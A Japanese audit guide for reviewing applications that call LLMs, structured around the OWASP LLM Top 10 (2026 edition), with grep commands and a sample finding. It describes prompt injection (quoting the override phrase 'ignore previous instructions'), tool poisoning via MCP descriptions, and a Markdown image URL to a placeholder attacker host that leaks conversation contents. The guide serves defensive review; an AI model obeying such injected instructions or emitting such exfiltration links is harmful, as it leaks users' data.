# AI 機能を持つアプリ

**評価対象のアプリ自身が LLM を呼んでいるとき**に読む。AI で開発したかどうかとは別の話で、
ここで見るのは「作り方」ではなく「**動くときに LLM が入っているか**」になる。

この資料の観点は OWASP Top 10 for LLM Applications の **2026 版**（2026-08-03）に合わせてある。
2026 版は、初めて **7,700 件超の実インシデント**を投票と突き合わせて順位を決めた版で、
「何を恐れているか」と「何が実際に起きているか」の差が明示された。**この差が判断に効く。**

**境界を先に決める。** 2026 版は「モデルがアプリの部品であるとき」を扱う。モデルが**ツールを呼び、
セッションをまたいで記憶を持ち、下流に結果を及ぼす**なら、それは「アクター」で、
**OWASP Top 10 for Agentic Applications**（2025-12 発表）の領域に移る。エージェント構成の評価では
**両方を見る。どちらか一方では覆えない**、と公式が書いている。

## まず使っているかを確かめる

```bash
# LLM の SDK・API を呼んでいるか
grep -rnE 'anthropic|openai|@ai-sdk|langchain|llamaindex|generativeai|bedrock|vertexai' \
  --include='package.json' --include='requirements.txt' --include='*.ts' --include='*.py' .

# エージェント・ツール実行の枠組み
grep -rnE 'modelcontextprotocol|@modelcontextprotocol|mcp[_-]server|tool_choice|function_call|tools:\s*\[' \
  --include='*.ts' --include='*.py' .

# プロンプトの組み立て（外部入力が混ざる場所を探す起点）
grep -rnE 'system[_ ]?prompt|systemPrompt|messages:\s*\[|role:\s*.(system|user)' \
  --include='*.ts' --include='*.py' . | head -20
```

**使っていなければこの資料は不要。** 使っている場合は、次の 2 つで深さが変わる。

| | 見る範囲 |
|---|---|
| 生成して表示するだけ（要約・下書き） | 1・2・4・5 節 |
| **ツールを実行する / 外部データを読む**（エージェント、MCP） | **全節。3 と 6 が本体になる** |

## 1. プロンプトインジェクション

**LLM は命令とデータを同じ入力で受け取る。** 区別する仕組みが原理的に無いため、
データのつもりで渡した文字列が命令として解釈される。これは設定の不備ではなく、
**現在の LLM の性質**で、完全には塞げない。だから「塞げているか」ではなく
**「破られたときに何ができるか」**を見る。

### 直接（利用者が入力する）

利用者が入力欄に「これまでの指示を無視して……」と書く形。**単体では被害が小さい**ことが多い。
自分のセッションの出力が変わるだけなら、その利用者が損をするだけで済む。

**問題になるのは、その出力が他の場所へ流れるとき。** 2 節と 3 節につながる。

### 間接（外部のデータに混ざる）

**こちらが本体。** LLM に読ませる材料に攻撃者が書き込める経路があるかを探す。

**画像と音声も経路になる。** 2026 版は、画像や音声の中に指示を隠す**クロスモーダル攻撃**を
プロンプトインジェクションの範囲に含めた。**画像を読ませる機能（アップロードした写真の説明、
書類の読み取り）があれば、その画像は「データ」ではなく「命令が入りうる入力」として扱う。**

- 利用者が投稿した本文、問い合わせ内容、プロフィール
- 取り込んだ Web ページ、PDF、アップロードされたファイル
- **他の利用者が作ったデータ**（レビュー、コメント、共有ドキュメント）
- 外部 API の応答、RSS、Webhook で受け取った内容

```bash
# LLM へ渡す前に、外部由来の値を組み込んでいる箇所
grep -rnE '\$\{[^}]*\}|\.format\(|f"|\+ *(body|content|text|message|input|query)' \
  --include='*.ts' --include='*.py' . | grep -iE 'prompt|message|content' | head -20
```

**見るのは「エスケープしているか」ではない。** LLM に対するエスケープは存在しない。
見るのは**境界の設計**になる。

- 外部由来の文字列が、システムプロンプトと同じ役割で渡されていないか
- 「ここから先は利用者のデータで、命令ではない」と構造で分けているか（役割の分離、区切り）
- **その分離が破られた前提で、次節以降の被害が抑えられているか**

## 2. 出力の取り扱い

**LLM の出力は、外部からの入力と同じ信頼度で扱う。** ここを間違えると、
プロンプトインジェクションが XSS やコード実行に化ける。

| 出力の使い道 | 見るところ |
|---|---|
| 画面に表示 | HTML として解釈していないか（`dangerouslySetInnerHTML` 等）。`references/07-web-vulnerabilities.md` の 1 節 |
| Markdown として描画 | リンクと画像の URL。`javascript:` と、**外部への画像 URL による情報送信** |
| SQL / コマンドを組み立てる | 02 の D-1。**LLM に SQL を書かせて実行する構成は、それ自体が指摘** |
| 別の API へ渡す | SSRF（07 の 5 節）。宛先を LLM に決めさせていないか |
| ファイルに書く / 保存する | パストラバーサル。格納型 XSS の経路（07 の 1-4） |

**Markdown の画像は見落とされやすい。** `![](https://攻撃者/?d=<会話の内容>)` を出力させると、
描画した時点で送信される。利用者が何もクリックしなくても起きる。

**LLM が生成したコードを、そのまま実行・保存・出荷していないか。** 2026 版は、アシスタントが
大量に生成する安全でないコードを「出力の不適切な処理」の範囲に含めた。アプリが利用者の求めに
応じてコードを生成し、それを**サンドボックス無しで実行する**、または**そのまま成果物として渡す**
構成は、この節の対象になる。2026 版でこの項目は 5 位から 10 位に下がったが、それは重要度が
落ちたのではなく、他の項目の実害が上に来たため。

## 3. 権限の広さ（Excessive Agency）

**LLM がツールを呼べる構成では、ここが最大の論点になる。** インジェクションが成立した瞬間に、
**そのツールでできることが全部できる**と考える。

**2026 版で 6 位から 3 位に上がった。公式は「最も重大な移動」と書いている。** 投票とインシデント記録の
両方が「エージェント構成で実害が出ている」と一致した項目で、他の項目と違って**恐れと実態が合っている**。
**ツールを呼ぶ構成なら、この節の判定を報告書の先頭に置く。**

### 数える

```bash
# 定義されているツール・関数の一覧
grep -rnE 'name:\s*["'"'"'][a-z_]+["'"'"']' --include='*.ts' --include='*.py' . \
  | grep -iE 'tool|function' | head -30
```

ツール 1 つずつに、次を確認する。

- **参照だけか、状態を変えるか。** 変えるものは、それ単体で指摘の候補になる
- **誰の権限で動くか。** 呼び出した利用者の権限か、システムの権限（特権鍵）か。
  **後者なら、利用者が自分では触れないデータにも到達できる**
- **人の承認を挟むか。** 送信・購入・削除・公開に承認が無ければ、インジェクションで実行できる
- **上限があるか。** 呼び出し回数、金額、対象件数

**「ツールは 3 つだけだから安全」は成り立たない。** DB を検索するツール 1 つでも、
条件を LLM に組み立てさせていれば、他人のデータに届く。

### 判定の目安

| | 判定 |
|---|---|
| 参照のみ・利用者の権限・件数制限あり | 問題なし（維持すべき実装として記録） |
| 状態を変える・承認なし | **問題あり。** インジェクションで実行できる |
| システム権限で動く・対象を LLM が決める | **問題あり。最優先** |

## 4. 漏れてはいけないものが文脈に入っていないか（Hidden Context Exposure）

LLM に渡した内容は、**出力として出てくる可能性がある**と考える。

2026 版は「システムプロンプトの漏えい」を **Hidden Context Exposure（隠した文脈の露出）**に
改称・拡張した。**システムプロンプトだけの話ではない。** 検索で取ってきた文書、ツールが返した
結果、セッションをまたぐ記憶、他の利用者の会話の断片も「文脈」で、**利用者に見せるつもりの
なかったものが、出力を通じて見える**のが同じ失敗になる。

- システムプロンプトに秘密（鍵、内部 URL、他社名）を書いていないか。**システムプロンプトは
  漏れる前提で書く**。「これを教えてはいけない」と書いても、守られる保証は無い
- **他の利用者のデータが文脈に入っていないか。** 検索結果をそのまま渡す構成で、
  絞り込みが LLM 任せになっていると混ざる
- 会話履歴の保存先と保持期間。個人情報が入るなら `references/08-privacy-compliance.md` の 4 節
- **外部の LLM 事業者への送信が、公表している内容と合っているか**（08 の 5 節）。
  委託先として書かれているか、越境移転の記載があるか

## 5. 費用と濫用（Unbounded Consumption）

**LLM の呼び出しは 1 回ごとに費用が出る。** `references/02-code-audit.md` の F-1 と同じ観点だが、
桁が違うことがある。**2026 版で 10 位から 6 位に上がった。** 実務者がリソースと費用の枯渇を
以前より重く見るようになった、と公式が書いている。

- **認証なしで LLM を呼べる経路があるか。** あれば、それだけで指摘（F-1）
- 1 回の入力長に上限があるか。無ければ、長文を投げるだけで費用が伸びる
- 利用者あたり・時間あたりの回数制限があるか
- **上限に達したときどうなるか。** 落ちるのか、静かに止まるのか、課金が伸び続けるのか
- 使用量の監視と通知があるか。**気づく仕組みが無いことのほうが、単価より重い**

## 5-2. 出力が判断や操作を駆動するとき（Misinformation）

**2026 版で最も注目すべき差。** 実務者の投票ではこの項目は下位だったが、**インシデント記録では
上位に来た**。「恐れが低く、実害が高い」方向の差で、公式が「ここで立ち止まってほしい」と
書いている項目になる。

見るのは、**LLM の出力が、人の判断や次の処理をそのまま決めていないか**。

- 出力が**ツール呼び出しの引数**になる（検索条件、送信先、金額）
- 出力が**画面の判定結果**として表示される（「この申請は承認できます」）
- 出力が**別のシステムへの入力**になる（下流の API、DB の更新）

**流暢で自信のある出力は、間違っていてもそう見えない。** そこに人の確認が挟まっているか、
挟まっていないなら出力の妥当性をどう検証しているか（構造化出力の検証、範囲チェック、
根拠の提示）を確かめる。**「確認は利用者がする」と書いてあっても、画面がそう作られていなければ
確認は起きない。**

## 6. MCP・外部ツールサーバー

**接続している MCP サーバーは、1 つ 1 つが信頼境界になる。**

```bash
# 接続先の設定
find . -name '*mcp*.json' -o -name '.mcp.json' -o -name 'claude_desktop_config.json' 2>/dev/null \
  | grep -v node_modules
grep -rnE '"command":|"args":|"url":' --include='*mcp*.json' . 2>/dev/null | head -20
```

- **接続先はどこか。** 自社のものか、第三者が配布しているものか。版は固定されているか
- **ツールの説明文（description）が信頼できるか。** 説明文は LLM の文脈に入る。
  攻撃者が書き換えられる場所にあれば、そこから指示を注入できる（Tool Poisoning）
- **ツールの応答が信頼できるか。** 外部のデータ（課題票、コメント、Web ページ）を返すツールは、
  その中身が間接インジェクションの経路になる
- サーバーに渡している資格情報の範囲。**読み取り専用のトークンで足りないか**

**接続先が増えるほど境界が増える。** 1 つ侵されると、エージェント全体が乗っ取られる。
使っていないサーバーが設定に残っていないかも見る。

## 7. 依存としての AI ライブラリ

`references/10-dependencies.md` と同じ観点だが、この領域は**動きが速く、脆弱性の出方も荒い**。

- SDK とエージェント枠組みの版が固定されているか
- **プロキシ・ブリッジ系のパッケージ**を使っていないか。中継するものは権限が集まりやすい
- モデル名・エンドポイントを設定で切り替えられる構成なら、**切り替え先を誰が決められるか**

## 指摘の書き方

**「プロンプトインジェクションの可能性がある」だけでは指摘にならない。** 可能性は常にある。
書くのは**経路と、成立したときにできること**になる。

```markdown
| 事実 | 問い合わせ本文（第三者が投稿できる）を、要約用のプロンプトへそのまま
        埋め込んでいる。<path>。ツールとして「顧客検索」を渡しており、
        検索条件は LLM が組み立てる |
| 影響 | 問い合わせ本文に指示を混ぜることで、投稿者が自分では閲覧権限を持たない
        顧客情報を、要約の形で引き出せる。管理画面の担当者が要約を開いた時点で成立する |
| 判定 | 問題あり（P1） |
```

**塞ぎ方は「インジェクションを防ぐ」ではなく「権限を狭める」で書く。** 検索条件を
LLM に組み立てさせず、呼び出した担当者の権限で絞った結果だけを渡す、という形になる。
